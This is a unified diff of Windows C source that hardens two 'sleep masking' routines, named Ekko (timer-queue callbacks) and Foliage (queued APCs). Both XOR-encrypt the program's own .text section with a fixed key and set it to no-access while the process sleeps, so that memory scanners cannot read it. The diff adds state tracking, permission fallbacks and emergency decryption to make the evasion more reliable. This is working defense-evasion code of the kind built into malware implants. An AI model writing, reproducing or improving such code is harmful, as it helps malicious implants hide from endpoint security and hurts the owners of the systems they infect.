@@ -67,7 +67,7 @@ static CreateTimerQueue_t      g_CreateTimerQueue      = NULL;
 static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
 static DeleteTimerQueueEx_t    g_DeleteTimerQueueEx    = NULL;
 static WaitForSingleObject_t   g_WaitForSingleObject   = NULL;
-typedef struct { void *text; SIZE_T text_sz; HANDLE event; } EkkoCtx;
+typedef struct { void *text; SIZE_T text_sz; HANDLE event; volatile LONG encrypted; } EkkoCtx;
 static EkkoCtx g_ekko_ctx;
 #endif
 
@@ -80,7 +80,7 @@ static NtCreateThreadEx_t    g_NtCreateThreadEx   = NULL;
 static NtQueueApcThread_t    g_NtQueueApcThread   = NULL;
 static NtAlertResumeThread_t g_NtAlertResumeThread = NULL;
 static NtTestAlert_t         g_NtTestAlert        = NULL;
-typedef struct { void *text; SIZE_T text_sz; HANDLE event; DWORD ms; } FoliageCtx;
+typedef struct { void *text; SIZE_T text_sz; HANDLE event; DWORD ms; volatile LONG encrypted; } FoliageCtx;
 static FoliageCtx g_foliage_ctx;
 #endif
 
@@ -578,7 +578,10 @@ void sleep_masked(DWORD ms) {
 
     plain_sleep(ms);
 
-    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
+    /* Restore writable before decrypt XOR; fallback to PAGE_READWRITE if
+     * EXECUTE+WRITE is blocked — writing to PAGE_EXECUTE_READ would fault. */
+    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
+        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
     for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
     g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
 }
@@ -602,7 +605,8 @@ void sleep_masked(DWORD ms) {
 
     plain_sleep(ms);
 
-    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
+    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
+        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
     for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
     g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
 }
@@ -619,6 +623,7 @@ static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
     if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
     for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
     g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
+    InterlockedExchange(&c->encrypted, 1);
 }
 
 __attribute__((section(".evasn"), noinline))
@@ -627,9 +632,11 @@ static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
     EkkoCtx *c = (EkkoCtx*)ctx;
     unsigned char *t = (unsigned char*)c->text;
     DWORD old;
-    g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old);
+    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
+        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
     for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
     g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
+    InterlockedExchange(&c->encrypted, 0);
     g_SetEvent(c->event);
 }
 
@@ -647,9 +654,10 @@ void sleep_masked(DWORD ms) {
     if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
     g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
 
-    g_ekko_ctx.text    = g_text;
-    g_ekko_ctx.text_sz = g_tsz;
-    g_ekko_ctx.event   = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    g_ekko_ctx.text      = g_text;
+    g_ekko_ctx.text_sz   = g_tsz;
+    g_ekko_ctx.encrypted = 0;
+    g_ekko_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
     if (!g_ekko_ctx.event) { plain_sleep(ms); return; }
 
     HANDLE hQ = g_CreateTimerQueue();
@@ -661,9 +669,23 @@ void sleep_masked(DWORD ms) {
     g_CreateTimerQueueTimer(&hT2, hQ, (WAITORTIMERCALLBACK)ekko_decrypt_cb,
                             &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);
 
-    g_WaitForSingleObject(g_ekko_ctx.event, ms + 5000);
+    DWORD wait_rc = g_WaitForSingleObject(g_ekko_ctx.event, ms + 10000);
 
     g_DeleteTimerQueueEx(hQ, (HANDLE)(LONG_PTR)(-1));
+
+    /* Emergency recovery: if the decrypt callback didn't fire (timer thread
+     * crash, system overload, etc.), .text is still NOACCESS+garbled.
+     * Restore it here — if we return with .text inaccessible the CPU will
+     * fault executing WinMain (the return address on our stack). */
+    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_ekko_ctx.encrypted, 0)) {
+        DWORD old;
+        unsigned char *t2 = (unsigned char*)g_ekko_ctx.text;
+        if (!g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
+            g_VProt(t2, g_ekko_ctx.text_sz, PAGE_READWRITE, &old);
+        for (SIZE_T i = 0; i < g_ekko_ctx.text_sz; i++) t2[i] ^= 0xA7;
+        g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READ, &old);
+    }
+
     g_CloseHandle(g_ekko_ctx.event);
     g_ekko_ctx.event = NULL;
 }
@@ -683,6 +705,7 @@ static VOID NTAPI foliage_encrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
     if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
     for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
     g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
+    InterlockedExchange(&c->encrypted, 1);
 }
 
 __attribute__((section(".evasn"), noinline))
@@ -700,9 +723,11 @@ static VOID NTAPI foliage_decrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
     FoliageCtx *c = (FoliageCtx*)ctx;
     unsigned char *t = (unsigned char*)c->text;
     DWORD old;
-    g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old);
+    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
+        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
     for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
     g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
+    InterlockedExchange(&c->encrypted, 0);
     g_SetEvent(c->event);
 }
 
@@ -727,10 +752,11 @@ void sleep_masked(DWORD ms) {
     if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
     g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
 
-    g_foliage_ctx.text    = g_text;
-    g_foliage_ctx.text_sz = g_tsz;
-    g_foliage_ctx.ms      = ms;
-    g_foliage_ctx.event   = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    g_foliage_ctx.text      = g_text;
+    g_foliage_ctx.text_sz   = g_tsz;
+    g_foliage_ctx.ms        = ms;
+    g_foliage_ctx.encrypted = 0;
+    g_foliage_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
     if (!g_foliage_ctx.event) { plain_sleep(ms); return; }
 
     /* Create thread suspended; it will drain the APC queue on alert-resume */
@@ -759,9 +785,19 @@ void sleep_masked(DWORD ms) {
     g_NtAlertResumeThread(hThread, NULL);
 
     /* Park main thread in ntdll until decrypt APC fires SetEvent */
-    g_WaitForSingleObject(g_foliage_ctx.event, ms + 10000);
+    DWORD wait_rc = g_WaitForSingleObject(g_foliage_ctx.event, ms + 15000);
 
     g_CloseHandle(hThread);
+
+    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_foliage_ctx.encrypted, 0)) {
+        DWORD old;
+        unsigned char *t2 = (unsigned char*)g_foliage_ctx.text;
+        if (!g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
+            g_VProt(t2, g_foliage_ctx.text_sz, PAGE_READWRITE, &old);
+        for (SIZE_T i = 0; i < g_foliage_ctx.text_sz; i++) t2[i] ^= 0xA7;
+        g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READ, &old);
+    }
+
     g_CloseHandle(g_foliage_ctx.event);
     g_foliage_ctx.event = NULL;
 }
